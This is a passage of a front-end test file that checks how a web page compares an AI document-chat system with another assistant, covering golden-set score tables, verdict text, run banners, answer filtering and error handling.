    expect(within(golden).getByText("121 questions · the same set Luccy's recorded score used (digest 2670070ea44a)")).toBeInTheDocument();
    expect(within(golden).getByText("Luccy's recorded run (28 Sep 2026): 74 of 121 right (61.2%), facts covered 70.6%, judged by gemini-3.5-flash-lite.")).toBeInTheDocument();
    expect(within(golden).getByText(/^Two identical Luccy runs flip 22–25 of these questions/)).toBeInTheDocument();
    expect(within(golden).getByText("Luccy's configuration changed since its score was recorded:")).toBeInTheDocument();
    expect(within(golden).getByRole("listitem")).toHaveTextContent("The router prompt (route) changed since the recorded run.");
    expect(within(golden).getByText(/^Documents: Luccy's recorded run searched its own index; this run searches DataGov's copy \(88 documents\)\./)).toBeInTheDocument();
    expect(screen.queryByRole("note", { name: "Partial run" })).not.toBeInTheDocument();

    const verdict = screen.getByRole("region", { name: "Verdict: DataGov chat compared with Luccy" });
    expect(within(verdict).getByText("Luccy's recorded score (28 Sep) on the same questions: 74 of 121 right (61.2%).")).toBeInTheDocument();
    const columns = within(screen.getByRole("region", { name: "Headline numbers" })).getAllByRole("columnheader").map((c) => c.textContent);
    expect(columns).toEqual(["Measure", "Luccy", "Luccy (2nd run)", "DataGov chat · Luccy only", "Luccy, recorded 28 Sep"]);
    expect(rowCells("Right answers")).toEqual(["80%", "80%", "80%", "61.2%"]);
    expect(rowCells("Questions answered")).toEqual(["10", "10", "10", "—"]);
    expect(rowCells("Typical time (median)")).toEqual(["12 s", "—", "14 s", "25 s"]);
    expect(rowCells("Lookup")).toEqual(["2 of 2 | 100%", "— | —", "1 of 2 | 50%", "1 of 2 | 50%"]);
    const pair = screen.getByRole("heading", { name: "Luccy and Luccy, recorded 28 Sep" }).parentElement!;
    expect(within(pair).getByText("Only Recorded right")).toBeInTheDocument();
    expect(within(pair).getByText("27 questions flipped against the recorded run; identical Luccy runs flip 22–25.")).toBeInTheDocument();

    // Nothing is left out but service failures; missing documents are listed, scored anyway.
    expect(screen.queryByRole("heading", { name: "Left out of the scores" })).not.toBeInTheDocument();
    expect(screen.queryByRole("heading", { name: /Need live warehouse data/ })).not.toBeInTheDocument();
    expect(screen.getByRole("heading", { name: "Answers lost to a service failure (0)" })).toBeInTheDocument();
    const missing = screen.getByRole("heading", { name: "Expected documents not in DataGov (1)" }).parentElement!;
    expect(within(missing).getByRole("listitem")).toHaveTextContent("q1 — What is the hotel limit? · missing 4435476587");

    const q1 = await screen.findByRole("button", { name: /What is the hotel limit\?/ });
    expect(within(q1).getByText("Recorded: Right")).toBeInTheDocument();
    expect(within(q1).getByText("Expected document not in DataGov")).toBeInTheDocument();
    fireEvent.click(q1);
    const panel = document.getElementById(q1.getAttribute("aria-controls")!)!;
    expect(within(panel).getByText(/^Expected documents not in DataGov:/)).toHaveTextContent("Expected documents not in DataGov: 4435476587. The question is scored anyway.");
    fireEvent.click(screen.getByRole("button", { name: "Luccy differs from its recorded run (2)" }));
    expect(screen.getByRole("button", { name: /Who approves travel\?/ })).toBeInTheDocument();         // recorded wrong, Luccy right
    expect(screen.getByRole("button", { name: /Parking allowance\?/ })).toBeInTheDocument();           // recorded right, Luccy didn't know
    expect(screen.queryByRole("button", { name: /Meal allowance\?/ })).not.toBeInTheDocument();
  });

  it("warns over a smoke run and a golden set that is not the recorded one", async () => {
    const summary = { ...GOLDEN_SUMMARY, complete: false, gold: { ...GOLDEN_SUMMARY.gold, selected: 4, same_as_recorded: false, digest: "abc123", changed_ids: ["q2"] } };
    const run = { ...RUNS[0], summary };
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json([run]), "/api/document-analyzer/comparisons/run-2/": () => json({ ...run, rows: GOLDEN_ROWS }) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const banner = await screen.findByRole("note", { name: "Partial run" });
    expect(within(banner).getByText("Partial run — not the full golden set")).toBeInTheDocument();
    expect(within(banner).getByText(/^This run asked 4 of the 121 golden questions \(a smoke run\)\./)).toBeInTheDocument();
    const golden = screen.getByRole("heading", { name: "Golden set" }).parentElement!;
    expect(within(golden).getByText("121 questions · not the set Luccy's recorded score used (digest abc123, recorded 2670070ea44a); 1 question changed since").closest("p")).toHaveClass("text-warn");
  });

  it("filters the questions and opens the answers side by side, as markdown without images or raw HTML", async () => {
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    expect(await screen.findByRole("button", { name: /Who approves travel\?/ })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "All questions (4)" })).toHaveAttribute("aria-pressed", "true");

    // Right against not right only: q4 (wrong vs didn't know) is not a difference.
    expect(within(screen.getByRole("group", { name: "Show questions" })).getAllByRole("button").map((b) => b.textContent))
      .toEqual(["All questions (4)", "DataGov chat differs from Luccy (1)"]);
    fireEvent.click(screen.getByRole("button", { name: "DataGov chat differs from Luccy (1)" }));
    expect(screen.queryByRole("button", { name: /Who approves travel\?/ })).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Parking allowance\?/ })).not.toBeInTheDocument();
    const q1 = screen.getByRole("button", { name: /What is the hotel limit\?/ });
    expect(within(q1).getByText("Chat: Wrong")).toBeInTheDocument();
    expect(within(q1).getByText("Luccy: Right")).toBeInTheDocument();
    expect(q1).toHaveAttribute("aria-expanded", "false");
    fireEvent.click(q1);
    expect(q1).toHaveAttribute("aria-expanded", "true");
    const panel = document.getElementById(q1.getAttribute("aria-controls")!)!;
    expect(within(panel).getByRole("heading", { name: "Luccy" })).toBeInTheDocument();
    expect(within(panel).getByText("€150").tagName).toBe("STRONG");
    expect(within(panel).getByText("€170 a night.")).toBeInTheDocument();
    expect(within(panel).getByText("10 s · facts covered 100%")).toBeInTheDocument();
    expect(within(panel).getByText("Cited: 123")).toBeInTheDocument();
    expect(panel.querySelector("img, b, script")).toBeNull();
    expect(within(panel).getByRole("link", { name: "x" })).toHaveAttribute("target", "_blank");

    fireEvent.click(screen.getByRole("button", { name: "All questions (4)" }));
    expect(screen.getByRole("button", { name: /Who approves travel\?/ })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /What is the hotel limit\?/ })).toBeInTheDocument();
  });

  it("switches runs with the picker and shows dashes for what a run lacks", async () => {
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const picker = await screen.findByRole("combobox", { name: "Comparison run" });
    expect(within(picker).getAllByRole("option").map((o) => o.textContent)).toEqual([expect.stringMatching(/· Finished$/), expect.stringMatching(/· Failed$/)]);
    fireEvent.change(picker, { target: { value: "run-1" } });
    await waitFor(() => expect(fetchMock).toHaveBeenCalledWith("/api/document-analyzer/comparisons/run-1/", expect.anything()));
    expect(await screen.findByText("No answers yet.")).toBeInTheDocument();
    expect(screen.getByText("Failed", { selector: "span" })).toBeInTheDocument();
    expect(screen.getByText("Not enough answers to compare yet.")).toBeInTheDocument();
    expect(screen.getByText("Luccy's run-to-run variation was not measured in this run.")).toBeInTheDocument();
    expect(screen.getByText("Right answers: Chat — (—) · Luccy — (—) · difference —")).toBeInTheDocument();
    expect(screen.getByText("No numbers yet.")).toBeInTheDocument();
  });

  it("shows a verdict the runner could not decide, and says when Luccy's own variation was not measured", async () => {
    const arms = Object.fromEntries(Object.entries(SUMMARY.arms).filter(([arm]) => arm !== "A2"));    // Luccy run once
    const summary = {
      ...SUMMARY, arms, noise_floor: null,
      verdicts: [{ arm: "C", vs: "A", outcome: "inconclusive", n: 10, delta: 2, threshold: null, ci_low: -0.08, ci_high: 0.28, disagree_rate: 0.2,
        luccy_disagree_rate: null, disagrees_more_than_luccy_itself: null, within_noise: null, text: "Can't tell yet: Luccy was run only once" }],
    };
    const run = { ...RUNS[0], summary };
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json([run]), "/api/document-analyzer/comparisons/run-2/": () => json({ ...run, rows: ROWS }) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const verdict = await screen.findByRole("region", { name: "Verdict: DataGov chat compared with Luccy" });
    expect(within(verdict).getByText("Inconclusive")).toBeInTheDocument();
    expect(within(verdict).getByText("Can't tell yet: Luccy was run only once")).toHaveClass("text-run");
    expect(within(verdict).getByText("Right answers: Chat 8 (80%) · Luccy 8 (80%) · difference +2 questions (95% CI −8 to +28 points)")).toBeInTheDocument();
    expect(within(verdict).getByText("DataGov chat disagreed with Luccy on 20% of questions; how often Luccy disagrees with itself was not measured.")).toBeInTheDocument();
    expect(within(verdict).getByText("Luccy's run-to-run variation was not measured in this run.")).toBeInTheDocument();
  });

  it("puts a prominent banner over a dry run", async () => {
    const run = { ...RUNS[0], params: { ...RUNS[0].params, dry_run: true } };
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json([run, RUNS[1]]), "/api/document-analyzer/comparisons/run-2/": () => json({ ...run, rows: ROWS }) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const banner = await screen.findByRole("note", { name: "Dry run" });
    expect(within(banner).getByText("Dry run — not real answers")).toBeInTheDocument();
    const picker = screen.getByRole("combobox", { name: "Comparison run" });
    expect(within(picker).getAllByRole("option").map((o) => o.textContent)).toEqual([expect.stringMatching(/· Finished · dry run$/), expect.stringMatching(/· Failed$/)]);
  });

  describe("polling", () => {
    beforeEach(() => { vi.useFakeTimers({ shouldAdvanceTime: true }); });
    afterEach(() => { vi.useRealTimers(); });
    const comparisonCalls = () => fetchMock.mock.calls.filter(([url]) => String(url).startsWith("/api/document-analyzer/comparisons/")).length;

    async function mountRunning(stale: boolean) {
      const run = { ...RUNS[0], status: "running", stale };
      routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json([run, RUNS[1]]), "/api/document-analyzer/comparisons/run-2/": () => json({ ...run, rows: ROWS }) });
      window.history.replaceState(null, "", "/document-analyzer?view=compare");
      mount();
      await screen.findByRole("button", { name: /Who approves travel\?/ });
    }

    it("shows a stale run as stopped and stops asking for it", async () => {
      await mountRunning(true);
      expect(screen.getByText("Stopped — no progress for 30+ minutes", { selector: "span" })).toHaveClass("text-warn");
      const picker = screen.getByRole("combobox", { name: "Comparison run" });
      expect(within(picker).getAllByRole("option")[0].textContent).toMatch(/· Stopped — no progress for 30\+ minutes$/);
      const before = comparisonCalls();
      await act(() => vi.advanceTimersByTimeAsync(60_000));
      expect(comparisonCalls()).toBe(before);
    });

    it("keeps asking for a running run that is not stale", async () => {
      await mountRunning(false);
      expect(screen.getByText("Running", { selector: "span" })).toBeInTheDocument();
      const before = comparisonCalls();
      await act(() => vi.advanceTimersByTimeAsync(60_000));
      expect(comparisonCalls()).toBeGreaterThan(before);
    });
  });

  it.each([403, 404])("hides the comparison when the backend answers %i", async (code) => {
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json({ detail: "Not allowed." }, code) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    expect(await screen.findByRole("textbox", CHAT_BOX)).toBeInTheDocument();
    expect(fetchMock).toHaveBeenCalledWith("/api/document-analyzer/comparisons/", expect.anything());
    expect(screen.queryByRole("group", { name: "Page view" })).not.toBeInTheDocument();
    expect(screen.queryByText("Not allowed.")).not.toBeInTheDocument();
  });

  it("offers a retry when the runs fail to load for another reason, and follows Back", async () => {
    let fail = true;
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => (fail ? json({ detail: "Server error" }, 500) : json(RUNS)) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    expect(await screen.findByText("Couldn't load the comparison")).toBeInTheDocument();
    fail = false;
    fireEvent.click(screen.getByRole("button", { name: "Try again" }));
    expect(await screen.findByRole("region", { name: "Verdict: DataGov chat compared with Luccy" })).toBeInTheDocument();
    act(() => {
      window.history.replaceState(null, "", "/document-analyzer");
      window.dispatchEvent(new PopStateEvent("popstate"));
    });
    expect(screen.getByRole("textbox", CHAT_BOX)).toBeInTheDocument();
    expect(screen.queryByRole("region", { name: "Verdict: DataGov chat compared with Luccy" })).not.toBeInTheDocument();
  });
});
